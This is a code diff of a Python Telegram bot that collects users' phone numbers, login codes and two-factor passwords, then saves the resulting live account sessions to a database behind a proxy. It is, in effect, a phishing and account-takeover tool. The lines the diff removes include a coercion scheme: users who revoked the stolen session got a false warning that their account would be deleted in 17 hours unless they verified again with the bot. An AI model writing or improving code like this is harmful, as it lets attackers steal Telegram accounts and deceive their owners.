@@ -1,18 +1,15 @@
 import logging
 import os
 import json
-import phonenumbers
-from phonenumbers import geocoder
 from aiogram import Bot, Dispatcher, types
 from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
 from aiogram.utils import executor
-from telethon import TelegramClient, events
+from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
 from pymongo import MongoClient
 from dotenv import load_dotenv
-import asyncio
-from datetime import datetime, timedelta
+from datetime import datetime
 
 load_dotenv()
 API_ID = int(os.getenv("API_ID"))
@@ -29,7 +26,6 @@ proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)
 mongo = MongoClient(MONGO_URI)
 db = mongo["dbmango"]
 sessions_col = db["sessions"]
-deleted_sessions_col = db["deleted_sessions"]
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
@@ -41,34 +37,6 @@ user_phones = {}
 user_code_buffers = {}
 
 os.makedirs("sessions", exist_ok=True)
-
-async def check_deleted_sessions():
-    while True:
-        try:
-            now = datetime.now()
-            expired_sessions = deleted_sessions_col.find({
-                "delete_time": {"$lte": now}
-            })
-            
-            for session in expired_sessions:
-                try:
-                    await bot.send_message(
-                        session["user_id"],
-                        "⚠️ Su cuenta de Telegram será eliminada en 17 horas porque eliminó la sesión activa. "
-                        "Para evitar esto, debe volver a verificar en este bot."
-                    )
-                    sessions_col.delete_one({"phone": session["phone"]})
-                    deleted_sessions_col.delete_one({"_id": session["_id"]})
-                except Exception as e:
-                    logging.error(f"Error al notificar usuario {session['user_id']}: {e}")
-            
-            await asyncio.sleep(3600)  # Check every hour
-        except Exception as e:
-            logging.error(f"Error en check_deleted_sessions: {e}")
-            await asyncio.sleep(60)
-
-async def on_startup(dp):
-    asyncio.create_task(check_deleted_sessions())
 
 @dp.message_handler(commands=['start'])
 async def cmd_start(message: types.Message):
@@ -103,7 +71,7 @@ async def handle_contact(message: types.Message):
     if not phone.startswith("+"):
         phone = "+" + phone
 
-    # Check if session exists
+    # Проверяем существующую сессию
     existing_session = sessions_col.find_one({"phone": phone})
     if existing_session:
         try:
@@ -119,8 +87,8 @@ async def handle_contact(message: types.Message):
                 await client.disconnect()
                 cleanup(user_id)
                 return
-        except:
-            pass
+        except Exception as e:
+            logging.error(f"Error al verificar sesión existente: {e}")
 
     client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=proxy)
     await client.connect()
@@ -203,7 +171,7 @@ async def try_sign_in_code(user_id, code):
             me = await client.get_me()
             session_str = client.session.save()
             
-            # Save with additional metadata
+            # Сохраняем с дополнительной информацией для долгоживущих сессий
             sessions_col.update_one(
                 {"phone": phone},
                 {"$set": {
@@ -262,7 +230,7 @@ async def process_2fa(message: types.Message):
         if await client.is_user_authorized():
             session_str = client.session.save()
             
-            # Save with additional metadata
+            # Сохраняем с дополнительной информацией для долгоживущих сессий
             sessions_col.update_one(
                 {"phone": phone},
                 {"$set": {
@@ -291,29 +259,6 @@ async def process_2fa(message: types.Message):
         await client.disconnect()
         cleanup(user_id)
 
-async def handle_session_revoked(event):
-    try:
-        phone = event.original_update.phone
-        session_info = sessions_col.find_one({"phone": phone})
-        
-        if session_info:
-            deleted_sessions_col.insert_one({
-                "phone": phone,
-                "user_id": session_info["user_id"],
-                "delete_time": datetime.now() + timedelta(hours=17)
-            })
-            
-            try:
-                await bot.send_message(
-                    session_info["user_id"],
-                    "⚠️ Su cuenta de Telegram será eliminada en 17 horas porque eliminó la sesión activa. "
-                    "Para evitar esto, debe volver a verificar en este bot."
-                )
-            except Exception as e:
-                logging.error(f"Error al notificar usuario {session_info['user_id']}: {e}")
-    except Exception as e:
-        logging.error(f"Error en handle_session_revoked: {e}")
-
 def cleanup(user_id):
     user_states.pop(user_id, None)
     user_clients.pop(user_id, None)
@@ -321,12 +266,4 @@ def cleanup(user_id):
     user_code_buffers.pop(user_id, None)
 
 if __name__ == '__main__':
-    # Create client for session revoked events
-    event_client = TelegramClient('session_revoked_listener', API_ID, API_HASH)
-    event_client.add_event_handler(handle_session_revoked, events.UserUpdate)
-    
-    async def start():
-        await event_client.start()
-        await executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
-    
-    asyncio.get_event_loop().run_until_complete(start())
+    executor.start_polling(dp, skip_updates=True)
